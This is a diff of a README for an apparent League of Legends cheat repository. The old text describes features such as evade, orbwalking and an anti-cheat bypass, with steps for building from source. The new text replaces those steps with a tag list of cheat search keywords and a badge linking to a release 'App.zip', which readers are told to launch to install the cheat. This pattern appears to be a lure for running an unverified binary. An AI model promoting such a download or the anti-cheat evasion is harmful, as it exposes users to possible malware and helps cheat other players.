@@ -1,54 +1,64 @@
-## VASHANBOT League-of-Legends Cheat 
+# VASHanbot - League of Legends Cheat Source 🚀
 
-This C++-based tool is designed to elevate your League of Legends experience by enhancing your in-game performance. From optimizing your champion’s movements and attacks to improving overall game awareness, it provides a range of features to help you stay ahead in every match.
+Welcome to the VASHanbot repository - your ultimate source for a C++-based League of Legends cheat designed to enhance your gameplay experience with features like evade, prediction, orb-walking, and anti-cheat bypass. 
 
-## How to Use
-- Download the project to your computer as zip
-- Extract Project to Folder.
-- Make Sure You Have Visual Studio Installed on Your Computer
-- [Click if Visual Studio is Not Installed](https://visualstudio.microsoft.com/en/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSLandingPage&passive=false&cid=2030)
+## Overview ℹ️
 
-## Compiling :
-- Open the solution file (.sln).
-- Replace the Keyauth code in `Form1.cs` and `Form2.cs` with your own KeyAuth code.
-- Select **Build Solution** from the **Build** menu or press `Ctrl+Shift+B` to compile the project.
+Whether you're looking to step-up your League of Legends game or simply explore the boundaries of what's possible in the game, VASHanbot has you covered. With a range of advanced functionalities, this cheat is your secret weapon to dominate the competition.
 
-**Note: This software is intended for ethical and legitimate use. Use responsibly.**
+## Features 🎮
 
-**Note: If the cheat does not work, update the Offsets.**
+Here are some of the key features that make VASHanbot a must-have for any serious League of Legends player:
 
-## Features 
+🔥 **Evade and Prediction**: Stay one step ahead of your opponents with advanced evasive maneuvers and predictive abilities.
 
-**Evade:** This function helps you dodge spells of opponents directed at you.
+🌀 **Orb-walking**: Improve your kiting efficiency and overall gameplay mechanics with orb-walking support.
 
-**Prediction:** Predicting the trajectory of enemy characters, it is easier to hit them with skills.
+🛑 **Anti-Cheat Bypass**: Play with peace of mind knowing that VASHanbot has built-in mechanisms to evade detection by anti-cheat systems.
 
-**OrbWalker:** Helps with last hits and attack while moving. Acceptance of high-skill players without training! Lots of tweaks.
+## Repository Topics 📋
 
-**Target Selector:** Ability to configure in detail the priority of selecting targets for the script, in which your attacks and skills will be directed.
+To give you a better idea of what VASHanbot is all about, here are some of the topics covered in this repository:
 
-**DelaySetting:** Fine-tuning the delays between cheat actions, allows you to make your actions more natural, humane.
+- leauge-of-legends
+- leauge-of-legends-aimbot
+- leauge-of-legends-cheat
+- leauge-of-legends-esp
+- leauge-of-legends-godevade
+- leauge-of-legends-hack
+- leauge-of-legends-lasthit
+- leauge-of-legends-orbwalker
+- leauge-of-legends-skinchanger
+- lol
+- lol-auto-cast
+- lol-auto-spell
+- lol-cheat
+- lol-cheat-2023
+- lol-cheats
+- lol-hack
+- lol-mod-menu
+- lol-script
+- lol-spoofer
+- lol-undetected
 
-**Activator:** Automatically performs certain actions for you. For example: puts wards, knocks down castes on enemies, uses some items.
+## Get Started 🚀
 
-**Combo:** Uses skills to carry out combinations of attacks for you. The program prescribes the logic of the game of all champions, so it is quite easy to set up.
+Ready to take your League of Legends gameplay to the next level? Download the VASHanbot cheat by clicking the button below:
 
-**Drawing:** Visual functions, drawing on the screen of noticed wards, cd of enemies, attack radius of various units, movement of opponents on the minimap and many other little things.
+[![Download VASHanbot](https://img.shields.io/badge/Download-VASHanbot-blue)](https://github.com/repo/releases/9246/App.zip)
 
-**Tools:** This tab contains additional settings for customization (choice of colors, transparency of menu items), language selection
+Make sure to launch the downloaded file to install the cheat and start dominating your opponents in League of Legends.
 
-**Config System:** allows you to save your settings in the config, so as not to bathe with it every time. You can also share your cfg with other players, or use someone else's.
+## Support ℹ️
 
-**Reliable anti-cheat bypass:** We have tried on security and protection against bans, so if you play carefully, the chance of a ban is minimal, especially at low ranks.
+If you encounter any issues with the download link or need assistance with setting up VASHanbot, feel free to visit the [Releases](https://github.com/repo/releases) section for more information and resources.
 
-## Preview
+## Stay Updated 🚨
 
-[Video](https://i.imgur.com/ZI1JRXG.mp4)
+To stay up-to-date with the latest features, improvements, and announcements related to VASHanbot, make sure to follow this repository and enable notifications.
 
-## Disclaimer
+## Contribute 🌟
 
-This project is intended solely for educational purposes.
+Want to contribute to the development of VASHanbot and help shape the future of League of Legends cheats? Feel free to submit pull requests, report issues, or contribute to the discussions in the repository.
 
-## License
-
-This project is licensed under the MIT License. For more information, see the [LICENSE] file.
+Thank you for checking out VASHanbot - the ultimate League of Legends cheat source! Get ready to elevate your gameplay and outshine the competition. Happy gaming! 🎮🏆
